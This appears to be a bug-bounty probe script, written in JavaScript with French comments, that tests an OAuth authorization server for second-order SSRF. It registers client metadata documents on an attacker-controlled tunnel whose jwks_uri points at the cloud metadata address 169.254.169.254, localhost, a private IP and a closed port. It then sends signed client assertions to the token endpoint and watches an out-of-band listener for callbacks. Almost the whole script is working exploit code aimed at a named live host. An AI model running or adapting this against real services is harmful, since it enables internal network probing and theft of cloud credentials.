// Test jwks_uri de SECOND ORDEUR, version corrigee (un chemin par cas, client_id exact)
import fs from "fs";
import crypto from "crypto";
const AS = "https://bugsecure-api.senintel.sn";
const TUN = fs.readFileSync("/tmp/opencode/tunnel_url2.txt", "utf8").trim();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const form = (o) => Object.entries(o).map(([k, v]) => encodeURIComponent(k) + "=" + encodeURIComponent(v)).join("&");
const KEY = fs.readFileSync("/tmp/opencode/jwks-key.pem", "utf8");
const KID = "bb-probe-key-1";
const logLines = () => { try { return fs.readFileSync("/tmp/opencode/jwks-listener.log", "utf8").trim().split("\n").filter(Boolean); } catch { return []; } };
const b64u = (b) => Buffer.from(b).toString("base64url");
function assertion(clientId, aud) {
  const now = Math.floor(Date.now() / 1000);
  const si = b64u(JSON.stringify({ alg: "RS256", typ: "JWT", kid: KID })) + "." + b64u(JSON.stringify({ iss: clientId, sub: clientId, aud: aud || AS, jti: crypto.randomUUID(), iat: now, exp: now + 300 }));
  return si + "." + b64u(crypto.sign("RSA-SHA256", Buffer.from(si), KEY));
}
async function F(u, o = {}) { let e = null; for (let a = 0; a < 3; a++) { try { return await fetch(u, { ...o, signal: AbortSignal.timeout(30000) }); } catch (x) { e = x; await sleep(2000); } } return null; }

const CASES = [
  { lbl: "témoin : document SANS jwks_uri", path: "/doc/nojwks.json" },
  { lbl: "jwks_uri = mon serveur (cle que je controle)", path: "/doc/jwks-mine.json" },
  { lbl: "jwks_uri = port ferme sur 127.0.0.1", path: "/doc/jwks-dead.json" },
  { lbl: "jwks_uri = metadonnees cloud 169.254.169.254", path: "/doc/jwks-cloud.json" },
  { lbl: "jwks_uri = localhost:8099", path: "/doc/jwks-localhost.json" },
  { lbl: "jwks_uri = 10.255.255.1 (prive)", path: "/doc/jwks-private.json" },
];

console.log("=== 1) /oauth/authorize : le document avec jwks_uri est-il accepte ? ===");
const accepted = {};
for (const c of CASES) {
  const clientId = TUN + c.path;
  const u = AS + "/oauth/authorize?" + form({ response_type: "code", client_id: clientId, redirect_uri: TUN + "/cb", scope: "programs:read profile:read reports:read reports:write", state: "bb-" + Date.now(), code_challenge: "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM", code_challenge_method: "S256", resource: AS });
  const r = await F(u, { redirect: "manual" });
  const loc = r?.headers.get("location") || "";
  const ok = loc.includes("/oauth/consent");
  accepted[c.path] = ok;
  console.log("  " + c.lbl.padEnd(46) + "HTTP " + (r?.status ?? 0) + " -> " + (ok ? "CONSENTEMENT (client enregistre)" : loc.replace(/^https:\/\/bugsecure\.senintel\.sn/, "") + (r ? "" : " ERR")));
  await sleep(1200);
}

console.log("\n=== 2) POST /oauth/token : l AS va-t-il chercher le jwks_uri ? ===");
for (const c of CASES) {
  const clientId = TUN + c.path;
  const before = logLines().length;
  const r = await F(AS + "/oauth/token", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: form({ grant_type: "authorization_code", code: "probe-code-bidon", redirect_uri: TUN + "/cb", client_id: clientId, client_assertion_type: "urn:ietf:params:oauth:client-assertion-type:jwt-bearer", client_assertion: assertion(clientId, AS), resource: AS, code_verifier: "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM" }) });
  const txt = r ? await r.text() : "ERR";
  const after = logLines().length;
  const newLines = logLines().slice(before);
  console.log("  " + c.lbl.padEnd(46) + "HTTP " + (r?.status ?? 0) + " | requete(s) recue(s) en plus: " + newLines.length);
  console.log("      -> " + txt.replace(/\s+/g, " ").slice(0, 170));
  for (const l of newLines) console.log("      OOB: " + l.slice(0, 150));
  await sleep(1500);
}

console.log("\n=== 3) private_key_jwt exige : un document avec token_endpoint_auth_method=private_key_jwt + jwks_uri ===");
const clientId = TUN + "/doc/jwks-private-key.json";
const u = AS + "/oauth/authorize?" + form({ response_type: "code", client_id: clientId, redirect_uri: TUN + "/cb", scope: "programs:read profile:read reports:read reports:write", state: "bb-" + Date.now(), code_challenge: "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM", code_challenge_method: "S256", resource: AS });
const r3 = await F(u, { redirect: "manual" });
console.log("  authorize -> HTTP " + (r3?.status ?? 0) + " " + (r3?.headers.get("location") || ""));
const before = logLines().length;
const r4 = await F(AS + "/oauth/token", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: form({ grant_type: "authorization_code", code: "probe-code-bidon", redirect_uri: TUN + "/cb", client_id: clientId, client_assertion_type: "urn:ietf:params:oauth:client-assertion-type:jwt-bearer", client_assertion: assertion(clientId, AS), resource: AS, code_verifier: "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM" }) });
console.log("  token     -> HTTP " + (r4?.status ?? 0) + " " + (r4 ? (await r4.text()).replace(/\s+/g, " ").slice(0, 200) : ""));
const newL = logLines().slice(before);
console.log("  requetes recues par mon serveur pendant le token: " + newL.length);
for (const l of newL) console.log("    " + l.slice(0, 160));
